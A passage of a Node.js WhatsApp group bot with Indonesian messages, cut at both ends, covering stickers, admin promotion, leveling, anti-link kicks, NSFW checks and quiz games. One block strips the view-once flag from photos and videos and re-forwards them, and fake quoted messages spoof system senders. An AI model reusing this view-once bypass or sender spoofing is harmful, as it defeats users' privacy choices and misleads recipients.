									res,
									body
								) {
									request
										(
											uri
										)
										.pipe(
											fs
											.createWriteStream(
												filename
											)
										)
										.on('close',
											callback
										);
								}
							);
					};
				download(
					url,
					'./stik' +
					names +
					'.png',
					async function() {
						console
							.log(
								'selesai'
							);
						let filess =
							'./stik' +
							names +
							'.png'
						let asw =
							'./stik' +
							names +
							'.webp'
						exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
							(
								err
							) => {
								let media =
									fs
									.readFileSync(
										asw
									)
								Maslent
									.sendMessage(
										to,
										media,
										MessageType
										.sticker, {
											quoted: mek
										}
									)
								fs.unlinkSync(
									filess
								)
								fs.unlinkSync(
									asw
								)
							}
						);
					});
			}

		const promoteAdmin =
			async function(to,
				target = []
			) {
				if (!target
					.length >
					0) {
					return reply(
						"No target.."
					)
				}
				let g =
					await Maslent
					.groupMetadata(
						to)
				let owner =
					g.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
					)
				let me =
					Maslent
					.user
					.jid
				for (i of
					target
				) {
					if (!i
						.includes(
							me
						) &&
						!i
						.includes(
							owner
						)
					) {
						const
							res =
							await Maslent
							.groupMakeAdmin(
								to,
								[
									i
								]
							)
						reply
							(
								`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`
							)
					}
				}
			}

		const demoteAdmin =
			async function(to,
				target = []
			) {
				if (!target
					.length >
					0) {
					return reply(
						"No target.."
					)
				}
				let g =
					await Maslent
					.groupMetadata(
						to)
				let owner =
					g.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
					)
				let me =
					Maslent
					.user
					.jid
				for (i of
					target
				) {
					if (!i
						.includes(
							me
						) &&
						!i
						.includes(
							owner
						)
					) {
						const
							res =
							await Maslent
							.groupDemoteAdmin(
								to,
								[
									i
								]
							)
						reply
							(
								`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`
							)

					}
				}
			}
		let authorname = Maslent
			.contacts[from] !=
			undefined ? Maslent
			.contacts[from]
			.vname || Maslent
			.contacts[from]
			.notify : undefined
		if (authorname !=
			undefined) {} else {
			authorname =
				groupName
		}

		function addMetadata(
			packname, author) {
			if (!packname)
				packname =
				'WABot';
			if (!author)
				author = 'Bot';
			author = author
				.replace(
					/[^a-zA-Z0-9]/g,
					'');
			let name =
				`${author}_${packname}`
			if (fs.existsSync(
					`./XNXXs1/${name}.exif`
				))
				return `./XNXXs1/${name}.exif`
			const json = {
				"sticker-pack-name": packname,
				"sticker-pack-publisher": author,
			}
			const littleEndian =
				Buffer.from([
					0x49,
					0x49,
					0x2A,
					0x00,
					0x08,
					0x00,
					0x00,
					0x00,
					0x01,
					0x00,
					0x41,
					0x57,
					0x07,
					0x00
				])
			const bytes = [0x00,
				0x00, 0x16,
				0x00, 0x00,
				0x00
			]
			let len = JSON
				.stringify(json)
				.length
			let last
			if (len > 256) {
				len = len - 256
				bytes.unshift(
					0x01)
			} else {
				bytes.unshift(
					0x00)
			}
			if (len < 16) {
				last = len
					.toString(
						16)
				last = "0" + len
			} else {
				last = len
					.toString(
						16)
			}
			const buf2 = Buffer
				.from(last,
					"hex")
			const buf3 = Buffer
				.from(bytes)
			const buf4 = Buffer
				.from(JSON
					.stringify(
						json))
			const buffer =
				Buffer.concat([
					littleEndian,
					buf2,
					buf3,
					buf4
				])
			fs.writeFile(
				`./XNXXs1/${name}.exif`,
				buffer, (
					err
				) => {
					return `./XNXXs1/${name}.exif`
				})
		}

		const
			getRegisteredRandomId =
			() => {
				return _registered[
						Math
						.floor(
							Math
							.random() *
							_registered
							.length
						)]
					.id
			}
		const
			addRegisteredUser =
			(userid, sender,
				age, time,
				serials) => {
				const obj = {
					id: userid,
					name: sender,
					age: age,
					time: time,
					serial: serials
				}
				_registered
					.push(obj)
				fs.writeFileSync(
					'./database/registered.json',
					JSON
					.stringify(
						_registered
					))
			}
		const
			checkRegisteredUser =
			(sender) => {
				let status =
					false
				Object.keys(
						_registered
					)
					.forEach((
						i
					) => {
						if (_registered[
								i
							]
							.id ===
							sender
						) {
							status
								=
								true
						}
					})
				return status
			}
		const isRegistered =
			checkRegisteredUser(
				sender)
		const sendButRegis = (
			id, text1,
			desc1, but = [],
			options = {}
		) => {
			const
				buttonMessage = {
					contentText: text1,
					footerText: desc1,
					buttons: but,
					headerType: 1,
				};
			Maslent
				.sendMessage(
					id,
					buttonMessage,
					MessageType
					.buttonsMessage,
					options
				);
		};

		const daftar1 =
			`Hai kak  ${pushname} ${ucapanWaktu} \n\nUmhhh Sebelumnya bot ${botname} belum mengenal kamu deh \nYok Kak Kenalan Dulu dengan Bot ${botname} dengan cara \n ketik tombol di bawah `
		const daftar2 =
			'```Ketuk Untuk Berkenalan```'
		const daftar3 = [{
			buttonId: `verify`,
			buttonText: {
				displayText: `Verify✔️`,
			},
			type: 1,
		}, ]

		const createSerial = (
			size) => {
			return crypto
				.randomBytes(
					size)
				.toString(
					'hex')
				.slice(0,
					size)
		}

		const getpc =
			async function(
				totalchat) {
				let pc = []
				let a = []
				let b = []
				for (c of
					totalchat
				) {
					a.push(c
						.jid
					)
				}
				for (d of
					a) {
					if (d &&
						!d
						.includes(
							'g.us'
						)
					) {
						b.push(
							d
						)
					}
				}
				return b
			}

		const time2 = moment()
			.tz('Asia/Jakarta')
			.format('HH:mm:ss')
		if (time2 <
			"23:59:00") {
			var ucapanWaktu2 =
				'Selamat Malam Jan Lupa Bobok🌃'
		}
		if (time2 <
			"19:00:00") {
			var ucapanWaktu2 =
				'Good Malam🌆'
		}
		if (time2 <
			"18:00:00") {
			var ucapanWaktu2 =
				'Selamat Senja🌇'
		}
		if (time2 <
			"15:00:00") {
			var ucapanWaktu2 =
				'Good Siang🏙️'
		}
		if (time2 <
			"11:00:00") {
			var ucapanWaktu2 =
				'selamat Pagi🌅'
		}
		if (time2 <
			"05:00:00") {
			var ucapanWaktu2 =
				'selamat Malam jan Lupa Bobok🌃'
		}
		const levelRole = level
			.getLevelingLevel(
				sender, _level)
		var role = 'Warrior III'
		if (levelRole <= 5) {
			role = 'Warrior II'
		} else if (levelRole <=
			10) {
			role = 'Warrior I'
		} else if (levelRole <=
			15) {
			role = 'Elite III'
		} else if (levelRole <=
			20) {
			role = 'Elite II'
		} else if (levelRole <=
			25) {
			role = 'Elite I'
		} else if (levelRole <=
			30) {
			role = 'Master III'
		} else if (levelRole <=
			35) {
			role = 'Master II'
		} else if (levelRole <=
			40) {
			role = 'Master I'
		} else if (levelRole <=
			45) {
			role =
				'GrandMaster III'
		} else if (levelRole <=
			50) {
			role =
				'GrandMaster II'
		} else if (levelRole <=
			55) {
			role =
				'GrandMaster I'
		} else if (levelRole <=
			60) {
			role = 'Epic III'
		} else if (levelRole <=
			65) {
			role = 'Epic II'
		} else if (levelRole <=
			70) {
			role = 'Epic I'
		} else if (levelRole <=
			75) {
			role = 'Legend III'
		} else if (levelRole <=
			80) {
			role = 'Legend II'
		} else if (levelRole <=
			85) {
			role = 'Legend I'
		} else if (levelRole <=
			90) {
			role = 'Mythic'
		} else if (levelRole <=
			95) {
			role =
				'Mythical Glory'
		} else if (levelRole >=
			100) {
			role = 'Immortal'
		}
		const time3 = moment()
			.tz("Asia/Jakarta")
			.format("HH:mm:ss");
		if (time3 <
			"24:59:00") {
			var ucapanWaktu =
				"Selamat malam";
		}
		if (time3 <
			"19:00:00") {
			var ucapanWaktu =
				"Selamat senja";
		}
		if (time3 <
			"18:00:00") {
			var ucapanWaktu =
				"Selamat sore";
		}
		if (time3 <
			"15:00:00") {
			var ucapanWaktu =
				"Selamat siang";
		}
		if (time3 <
			"11:00:00") {
			var ucapanWaktu =
				"Selamat pagi";
		}
		if (time3 <
			"05:00:00") {
			var ucapanWaktu =
				"Selamat malam";
		}


		const time5 = moment()
			.tz("Asia/Jakarta")
			.format("HH:mm:ss");
		if (time5 <
			"24:59:00") {
			var ucapanWaktu5 =
				"おやすみなさい";
		}
		if (time5 <
			"19:00:00") {
			var ucapanWaktu5 =
				"ハッピートワイライト";
		}
		if (time5 <
			"18:00:00") {
			var ucapanWaktu5 =
				"こんにちは";
		}
		if (time5 <
			"15:00:00") {
			var ucapanWaktu5 =
				"こんにちは";
		}
		if (time5 <
			"11:00:00") {
			var ucapanWaktu5 =
				"おはようございます";
		}
		if (time5 <
			"05:00:00") {
			var ucapanWaktu5 =
				"おやすみなさい";
		}
		// FUNCTION LEVELING
		if (isGroup && !mek.key
			.fromMe && !level
			.isGained(sender) &&
			isLevelingOn) {
			try {
				level
					.addCooldown(
						sender)
				const checkATM =
					atm
					.checkATMuser(
						sender,
						_uang)
				if (checkATM ===
					undefined)
					atm.addATM(
						sender,
						_uang)
				const uangsaku =
					Math.floor(
						Math
						.random() *
						(15 -
							25 +
							1) +
						20)
				atm.addKoinUser(
					sender,
					uangsaku,
					_uang)
				const
					currentLevel =
					level
					.getLevelingLevel(
						sender,
						_level)
				const amountXp =
					Math.floor(
						Math
						.random() *
						(15 -
							25 +
							1) +
						20)
				const
					requiredXp =
					10 * Math
					.pow(
						currentLevel,
						2) +
					50 *
					currentLevel +
					100
				level
					.addLevelingXp(
						sender,
						amountXp,
						_level)
				if (requiredXp <=
					level
					.getLevelingXp(
						sender,
						_level)
				) {
					level
						.addLevelingLevel(
							sender,
							1,
							_level
						)
					const
						userLevel =
						level
						.getLevelingLevel(
							sender,
							_level
						)
					const
						fetchXp =
						10 *
						Math
						.pow(
							userLevel,
							2) +
						50 *
						userLevel +
						100
					reply(
						`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`
					)
				}
			} catch (err) {
				console.error(
					err)
			}
		}
		colors = ['red',
			'white',
			'black', 'blue',
			'yellow',
			'green'
		]
		const isMedia = (
			type ===
			'imageMessage' ||
			type ===
			'videoMessage')
		const isQuotedImage =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'imageMessage')
		const isQuotedVideo =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'videoMessage')
		const isQuotedAudio =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'audioMessage')
		const isQuotedSticker =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'stickerMessage'
			)
		const troli = {
			key: {
				fromMe: false,
				remoteJid: "status@broadcast",
				participant: '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 300,
					status: 200,
					thumbnail: fakeimage,
					surface: 200,
					message: fake,
					orderTitle: 'Maslent',
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		const ftext = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"extendedTextMessage": {
					"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,
					"title": `Hmm`,
					'jpegThumbnail': fs
						.readFileSync(
							'./XNXXs2/ppk2.jpg'
						)
				}
			}
		}
		// const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./XNXXs2/ppk2.jpg`)},"title": `HALLO...${pushname}JANGAN LUPA DI ORDER`,"description": "KURRXD KANG TOLOL", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": `${botname}`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}

		// Anti link
		if (isGroup && m
			.mtype ==
			'viewOnceMessage') {
			var msg = {
				...mek
			}
			msg.message = mek
				.message
				.viewOnceMessage
				.message
			msg.message[Object
					.keys(msg
						.message
					)[0]]
				.viewOnce =
				false
			reply(
				'Terdeteksi Mengirim Foto/Video ViewOnce'
			)
			Maslent
				.copyNForward(
					from, msg)
		}
		if (messagesC.match(
				'https://wa.me/'
			)) {
			if (!isGroup) return
			if (!isAntiLink)
				return
			if (isGroupAdmins)
				return
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			if (messagesC
				.includes(
					'#izinadmin'
				))
				return reply(
					'#izinadmin diterima'
				)
			var kic =
				`${sender.split('@')[0]}@s.whatsapp.net`
			xexe =
				`Antilink Detector, maaf @${sender.split('@')[0]} anda akan di kick dari group`
			Maslent.groupRemove(
					from, [kic])
				.catch((e) => {
					reply(
						`*ERR:* ${e}`
					)
				})
			button = [
			{
				buttonId: `${prefix}antilink 0`,
				buttonText: {
					displayText: 'MATIKAN ANTIKLINK'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${xexe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
		}
		if (messagesC.match(
				'wa.me/')) {
			if (!isGroup) return
			if (!isAntiLink)
				return
			if (isGroupAdmins)
				return
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			if (messagesC
				.includes(
					'#izinadmin'
				))
				return reply(
					'#izinadmin diterima'
				)
			var kic =
				`${sender.split('@')[0]}@s.whatsapp.net`
			xexe =
				`Antilink Detector, maaf @${sender.split('@')[0]} anda akan di kick dari group`
			Maslent.groupRemove(
					from, [kic])
				.catch((e) => {
					reply(
						`*ERR:* ${e}`
					)
				})
			button = [
			{
				buttonId: `${prefix}antilink 0`,
				buttonText: {
					displayText: 'MATIKAN ANTIKLINK'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${xexe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			const
				sendButMessage =
				(id, text1,
					desc1,
					but = [],
					options = {}
				) => {
					const
						buttonMessage = {
							contentText: text1,
							footerText: desc1,
							buttons: but,
							headerType: 1,
						};
					Maslent
						.sendMessage(
							id,
							buttonMessage,
							MessageType
							.buttonsMessage,
							options
						);
				};
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
		}
		if (messagesC.match(
				'Wa.me/')) {
			if (!isGroup) return
			if (!isAntiLink)
				return
			if (isGroupAdmins)
				return
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			if (messagesC
				.includes(
					'#izinadmin'
				))
				return reply(
					'#izinadmin diterima'
				)
			var kic =
				`${sender.split('@')[0]}@s.whatsapp.net`
			xexe =
				`Antilink Detector, maaf @${sender.split('@')[0]} anda akan di kick dari group`
			Maslent.groupRemove(
					from, [kic])
				.catch((e) => {
					reply(
						`*ERR:* ${e}`
					)
				})
			button = [
			{
				buttonId: `${prefix}antilink 0`,
				buttonText: {
					displayText: 'MATIKAN ANTIKLINK'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${xexe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
		}
		if (messagesC.match(
				'https://chat.whatsapp.com/'
			)) {
			if (!isGroup) return
			if (!isAntiLink)
				return
			if (isGroupAdmins)
				return
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			if (messagesC
				.includes(
					'#izinadmin'
				))
				return reply(
					'#izinadmin diterima'
				)
			var kic =
				`${sender.split('@')[0]}@s.whatsapp.net`
			xexe =
				`Antilink Detector, maaf @${sender.split('@')[0]} anda akan di kick dari group`
			Maslent.groupRemove(
					from, [kic])
				.catch((e) => {
					reply(
						`*ERR:* ${e}`
					)
				})
			button = [
			{
				buttonId: `${prefix}antilink 0`,
				buttonText: {
					displayText: 'MATIKAN ANTIKLINK'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${xexe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
		}
		//=======autorespin
		stod = `${sender}`
		for (let i = 0; i <
			commandsDB
			.length; i++) {
			if (budy ==
				commandsDB[i]
				.pesan) {
				Maslent
					.sendMessage(
						from,
						commandsDB[
							i]
						.balasan,
						text, {
							sendEphemeral: true,
							quoted: mek,
							contextInfo: {
								forwardingScore: 600,
								isForwarded: true,
								mentionedJid: [
									stod
								]
							}
						})


			}
		}


		if (isGroup && !
			isGroupAdmins &&
			isBotGroupAdmins) {
			if (isImage) {
				var filePath =
					await Maslent
					.downloadAndSaveMediaMessage(
						mek);
				var form =
					new FormData();
				var stats = fs
					.statSync(
						filePath
					);
				var fileSizeInBytes =
					stats.size;
				var fileStream =
					fs
					.createReadStream(
						filePath
					);
				form.append(
					'img',
					fileStream, {
						knownLength: fileSizeInBytes
					});
				var options = {
					method: 'POST',
					credentials: 'include',
					body: form
				}
				var get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/nsfwcheck?apikey=${lolkey}`, {
							...
							options
						})
				fs.unlinkSync(
					filePath
				)
				var get_resulttt =
					get_result
					.result
				var is_nsfw =
					"No"
				if (Number(
						get_resulttt
						.replace(
							"%",
							"")
					) >= 60)
					var is_nsfw =
						"Yes"
				if (is_nsfw ===
					"Yes") {
					reply(
						`Gambar NSFW Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`
					)
					Maslent
						.groupRemove(
							from,
							[
								sender
							]
						)
				}
			}
		}

		if (isCmd && !isGroup) {
			addBalance(sender,
				randomNomor(
					20),
				balance)
			console.log(color(
					'[CMD]'
				),
				color(
					moment(
						mek
						.messageTimestamp *
						1000
					)
					.format(
						'DD/MM/YYYY HH:mm:ss'
					),
					'yellow'
				),
				color(
					`${command} [${args.length}]`
				))
		}
		if (isCmd && isGroup) {
			addBalance(sender,
				randomNomor(
					20),
				balance)
			console.log(color(
					'[CMD]'
				),
				color(
					moment(
						mek
						.messageTimestamp *
						1000
					)
					.format(
						'DD/MM/YYYY HH:mm:ss'
					),
					'yellow'
				),
				color(
					`${command} [${args.length}]`
				),
				'from',
				color(
					pushname
				), 'in',
				color(
					groupName
				))
		}
		var chats =
			await Maslent.chats
			.array.filter(v => v
				.jid.endsWith(
					'g.us'))
		chats.map(async ({
			jid
		}) => {
			if (readG ===
				false
			)
				return
			await Maslent
				.chatRead(
					jid
				)
		})
		var chatss =
			await Maslent.chats
			.array.filter(v => v
				.jid.endsWith(
					's.whatsapp.net'
				))
		chatss.map(async ({
			jid
		}) => {
			if (readP ===
				false
			)
				return
			await Maslent
				.chatRead(
					jid
				)
		})
		const sticOk = (
			hehe) => {
			ano = fs
				.readFileSync(
					'./database/bot/chu.webp'
				)
			Maslent
				.sendMessage(
					hehe,
					ano,
					sticker, {
						quoted: mek
					})
		}

		//Auto Vn
		Maslent.updatePresence(
			from, Presence
			.recording)



		let {
			banChats,
		} = setting

		function banChat() {
			if (banChats ==
				true) {
				return false
			} else {
				return true
			}
		}

		if (!isGroup && !
			isCmd && !command &&
			!mek.key.fromMe && !
			autorespon) {
			simi =
				await fetchJson(
					`https://api.lolhuman.xyz/api/simi?apikey=Chikey&text=${cmd}`
				)
			sami = simi.success
			reply(simi.result)
		}
		if (!setting.autoread) {
			Maslent.chatRead(
				from)
		}
		if (!setting
			.autocomposing) {
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
		}
		if (!setting
			.autorecording) {
			Maslent
				.updatePresence(
					from,
					Presence
					.recording)
		}
		// Sewa
		_sewa.expiredCheck(
			Maslent, sewa)

		// MUTE
		if (isMuted) {
			if (!
				isGroupAdmins &&
				!isPremium)
				return
		}

		const getWin = (
			userId) => {
			let position =
				false
			Object.keys(
					_win)
				.forEach((
					i
				) => {
					if (_win[
							i
						]
						.jid ===
						userId
					) {
						position
							=
							i
					}
				})
			if (position !==
				false) {
				return _win[
						position
					]
					.win
			}
		}
		// GAME 
		game.cekWaktuFam(
			Maslent,
			family100)

		if (tebakgambar
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakgambar[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var http =
					randomNomor(
						100)
				addBalance(
					sender,
					http,
					balance)
				await reply(
					`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`
				)
				delete tebakgambar
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebakgambar.json",
					JSON
					.stringify(
						tebakgambar
					))
			}
		}
		if (game.isfam(from,
				family100)) {
			var anjuy = game
				.getjawaban100(
					from,
					family100)
			for (let i of
					anjuy) {
				if (budy
					.toLowerCase()
					.includes(i)
				) {
					var htgmp =
						Math
						.floor(
							Math
							.random() *
							20
						) +
						1
					addBalance(
						sender,
						htgmp,
						balance
					)
					await reply(
						`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`
					)
					var anug =
						anjuy
						.indexOf(
							i)
					anjuy
						.splice(
							anug,
							1)
				}
			}
			if (anjuy.length <
				1) {
				Maslent
					.sendMessage(
						from,
						`Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`,
						text)
				family100
					.splice(game
						.getfamposi(
							from,
							family100
						), 1
					)
			}
		}
		if (tebakanime
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakanime[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmu,
					balance)
				await reply(
					`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`
				)
				delete tebakanime
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebakanime.json",
					JSON
					.stringify(
						tebakanime
					))
			}
		}
		if (tebaklagu
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebaklagu[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htpl =
					randomNomor(
						100)
				addBalance(
					sender,
					htpl,
					balance)
				await reply(
					`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`
				)
				delete tebaklagu
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebaklagu.json",
					JSON
					.stringify(
						tebaklagu
					))
			}
		}
		if (tebaktebakan
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaktebakan[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htpu =
					randomNomor(
						100)
				addBalance(
					sender,
					htpu,
					balance)
				await reply(
					`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`
				)
				delete tebaktebakan
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebaktebakan.json",
					JSON
					.stringify(
						tebaktebakan
					))
			}
		}
		if (kuismath
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = kuismath[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htcc =
					randomNomor(
						100)
				addBalance(
					sender,
					htcc,
					balance)
				await reply(
					`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`
				)
				delete kuismath[
					sender
					.split(
						'@'
					)[0]
				]
				fs.writeFileSync(
					"./database/kuismath.json",
					JSON
					.stringify(
						kuismath
					))
			}
		}
		if (asahotak
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = asahotak[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgm =
					randomNomor(
						100)
				addBalance(
					sender,
					htgm,
					balance)
				await reply(
					`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`
				)
				delete asahotak[
					sender
					.split(
						'@'
					)[0]
				]
				fs.writeFileSync(
					"./database/asahotak.json",
					JSON
					.stringify(
						asahotak
					))
			}
		}
		if (caklontong
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				caklontong[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmi =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmi,
					balance)
				await reply(
					`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`
				)
				delete caklontong
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/caklontong.json",
					JSON
					.stringify(
						caklontong
					))
			}
		}
		if (tebakjenaka
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakjenaka[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmuu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmuu,
					balance)
				await reply(
					`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`
				)
				delete tebakjenaka
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebakjenaka.json",
					JSON
					.stringify(
						tebakjenaka
					))
			}
		}
		if (tebaklirik
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaklirik[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmii =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmii,
					balance)
				await reply(
					`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`
				)
				delete tebaklirik
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebaklirik.json",
					JSON
					.stringify(
						tebaklirik
					))
			}
		}
		if (tebakimia
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebakimia[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmcc =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmcc,
					balance)
				await reply(
					`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`
				)
				delete tebakimia
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebakimia.json",
					JSON
					.stringify(
						tebakimia
					))
			}
		}
		if (tebaksiapaaku
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaksiapaaku[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmk =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmk,
					balance)
				await reply(
					`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`
				)
				delete tebaksiapaaku
					[sender
						.split(
							'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebaksiapaaku.json",
					JSON
					.stringify(
						tebaksiapaaku
					))
			}
		}
		if (tebakbendera
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakbendera[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var html =
					randomNomor(
						100)
				addBalance(
					sender,
					html,
					balance)
				await reply(
					`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`
				)
				delete tebakbendera
					[sender
						.split(
							'@'
						)[0]
					]
